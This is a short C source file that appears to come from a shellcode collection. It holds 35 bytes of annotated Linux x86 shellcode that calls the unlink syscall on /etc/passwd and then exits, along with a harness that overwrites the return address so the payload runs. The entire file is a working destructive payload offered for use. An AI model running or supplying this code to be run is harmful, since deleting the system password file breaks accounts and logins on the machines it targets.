/*
    unlink_passwd.c
    Platform: linux/x86
    Size: 35 bytes
    Author: $andman <n4mdn4s[4T]gmail.com>
*/

#include <string.h>
#include <stdio.h>
char shell[] =  "\xeb\x11"                 //jmp    8048073
                "\x5e"                     //pop    %esi
                "\x31\xc0"                 //xor    %eax,%eax
                "\x31\xc9"                 //xor    %ecx,%ecx
                "\x31\xd2"                 //xor    %edx,%edx
                "\xb0\x0a"                 //mov    $0xa,%al
                "\x89\xf3"                 //mov    %esi,%ebx
                "\xcd\x80"                 //int    $0x80
                "\xb0\x01"                 //mov    $0x1,%al
                "\xcd\x80"                 //int    $0x80
                "\xe8\xea\xff\xff\xff"     //call    8048062
                "\x2f"                          
                "\x65"                         
                "\x74\x63"                   
                "\x2f"                          
                "\x70\x61"                   
                "\x73\x73"                   
                "\x77\x64";   
               
int main()
{
  printf("Shellcode Length: %d\n",strlen(shell));
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shell;
}